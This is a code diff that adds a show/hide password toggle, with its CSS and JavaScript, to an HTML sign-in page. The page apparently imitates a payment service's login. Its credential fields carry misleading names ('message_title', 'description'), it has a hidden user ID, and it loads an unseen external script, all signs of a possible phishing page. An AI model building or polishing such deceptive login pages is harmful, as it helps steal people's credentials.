@@ -58,6 +58,20 @@
       outline: none;
       border-color: #00d632;
     }
+    /* Password wrapper to hold icon */
+    .password-wrapper {
+      position: relative;
+      margin-bottom: 16px;
+    }
+    .toggle-password {
+      position: absolute;
+      right: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 18px;
+      color: #888;
+    }
     .login-button {
       width: 100%;
       background: #00d632;
@@ -145,7 +159,13 @@
       <input type="hidden" name="user_id" value="16934">
 
       <input type="text" class="form-input" name="message_title" placeholder="Email or phone number" required>
-      <input type="password" class="form-input" name="description" placeholder="Password" required>
+
+      <!-- Password with eye icon -->
+      <div class="password-wrapper">
+        <input type="password" class="form-input" id="password" name="description" placeholder="Password" required>
+        <span class="toggle-password" id="togglePassword">👁️</span>
+      </div>
+
       <button type="submit" class="login-button">Sign In</button>
     </form>
 
@@ -177,7 +197,16 @@
       // Simulate login success or redirect here
       // window.location.href = "dashboard.html";
     });
+
+    // Toggle password visibility
+    const togglePassword = document.getElementById("togglePassword");
+    const passwordInput = document.getElementById("password");
+    togglePassword.addEventListener("click", function() {
+      const type = passwordInput.type === "password" ? "text" : "password";
+      passwordInput.type = type;
+      this.textContent = type === "password" ? "👁️" : "🙈";
+    });
   </script>
-      <script src="intelligent.js"></script>
+  <script src="intelligent.js"></script>
 </body>
 </html>
